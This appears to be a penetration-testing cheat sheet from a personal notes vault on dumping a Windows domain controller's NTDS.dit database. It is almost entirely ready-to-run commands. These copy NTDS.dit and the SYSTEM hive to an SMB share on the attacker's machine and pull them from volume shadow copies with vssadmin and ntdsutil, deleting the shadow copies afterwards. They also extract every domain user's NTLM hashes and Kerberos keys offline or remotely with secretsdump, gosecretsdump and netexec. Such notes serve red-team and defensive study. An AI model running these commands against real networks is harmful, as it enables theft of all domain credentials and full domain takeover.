---
Primary_category: "[[WINDOWS CREDENTIALS DUMPING]]"
title: "NTDS"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[WINDOWS CREDENTIALS DUMPING]]

#### *Exfiltration - Down DC*

##### *OS File System*

###### *From the Attacker*

```bash
smbserver.py -smb2support -username <USER> -password <PASSWORD> <SHARE_NAME> <SHARE_PATH>
```

###### *From the Target*

```bash
net use X: \\<ATTACKER>\<SHARED_FOLDER> /USER:<USER> <PASSWORD>
```

```bash
Copy-Item -Force -Path 'C:\Windows\NTDS\NTDS.dit', 'C:\Windows\System32\Config\SYSTEM' -Destination 'X:'
```

---

#### *Exfiltration - Live DC*

##### *VSSAdmin*

###### *Creating Shadow Copy of the Volume*

```bash
vssadmin CREATE SHADOW /For=C:
```

###### *Extracting NTDS.dit from VSS*

```bash
cmd.exe /c copy <SHADOW_COPY_NAME>\Windows\NTDS\NTDS.dit <OUTPUT_FILE>
cmd.exe /c copy <SHADOW_COPY_NAME>\Windows\System32\Config\SYSTEM <OUTPUT_FILE>
```


> [!DANGER]- *e.g.*
>
> ```bash
> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit.save
> ```
> ```bash
> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\Config\SYSTEM C:\Windows\Temp\system.save
> ```
>

###### *Shadow Copy remove*

```bash
vssadmin delete shadows /shadow=<SHADOW_COPY_ID>
```

##### *NTDSUtil*

###### *From the Attacker*

```bash
smbserver.py -smb2support -username <USER> -password <PASSWORD> <SHARE_NAME> <SHARE_PATH>
```

###### *From the Target*

```bash
net use X: \\<ATTACKER>\<SHARED_FOLDER> /USER:<USER> <PASSWORD>
```

```bash
ntdsutil "ac i ntds" "ifm" "create full X:\NTDS" quit quit
```

##### *Invoke-NinjaCopy.ps1*

> ***[Invoke-NinjaCopy.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)***

```bash
Invoke-NinjaCopy.ps1 -Path 'C:\Windows\NTDS\NTDS.dit' -LocalDestination 'C:\Windows\Temp\ntds.dit.save'
```

---

#### *Secrets Dump - Offline*

Once the ***NTDS.dit*** and the ***SYSTEM*** files are obtained, just proceed as follows to extract the data from them →

> ***Check all related to the SYSTEM Hive Extraction [[SAM & SECURITY|here]]***

##### *Secretsdumpy.py*

> ***[SecretsDump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)***

###### *Offline Dumping*

First, both the ***NTDS.dit*** and the ***SYSTEM*** hive must be extracted from the target

Then, these files are parsed locally as follows →

```bash
secretsdump.py -outputfile <FILE> -ntds <NTDS> -system <SYSTEM> local
```

##### *Gosecretsdump*

> ***[Gosecretsdump](https://github.com/c-sto/gosecretsdump)***

> ***Faster for larger NTDS.dit files***

```bash
gosecretsdump -ntds <NTDS> -system <SYSTEM>
```

---

#### *Secrets Dump - Remote*

##### *Netexec*

> ***[Netexec](https://github.com/Pennyw0rth/NetExec)***

###### *DRSUAPI Method*

```bash
nxc smb <TARGET> --username '<USER>' --password '<PASSWORD>' --ntds drsuapi
```

###### *VSS Method*

> ***Volume Shadow Copy Service***

```bash
nxc smb <TARGET> --username '<USER>' --password '<PASSWORD>' --ntds vss
```

##### *Secretsdump.py*

> ***[SecretsDump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)***

Regarding ***Authentication***, the different approaches seen [[SAM & SECURITY#Remote Dumping|here]] can also be applied when extracting the ***NTSD.dit***

###### *DRSUAPI*

> ***Standard Method***

- ***Extract all data from All Users***

```bash
secretsdump.py '<DOMAIN/WORKGROUP>/<USER>:<PASSWORD>@<TARGET>'
```

- ***Extract data from a given user***

```bash
secretsdump.py -just-dc-user <USER> '<DOMAIN/WORKGROUP>/<USER>:<PASSWORD>@<TARGET>'
```

- ***NTLM Hashes Only***

> **`-just-dc-ntlm`**

```bash
secretsdump.py -just-dc-ntlm '<DOMAIN/WORKGROUP>/<USER>:<PASSWORD>@<TARGET>'
```

- ***NTLM Hashes and Kerberos EKeys***

> **`-just-dc`**

```bash
secretsdump.py -just-dc '<DOMAIN/WORKGROUP>/<USER>:<PASSWORD>@<TARGET>'
```

###### *NTDSUTIL VSS*

```bash
secretsdump.py -just-dc-ntlm -use-vss '<DOMAIN/WORKGROUP>/<USER>:<PASSWORD>@<TARGET>'
```
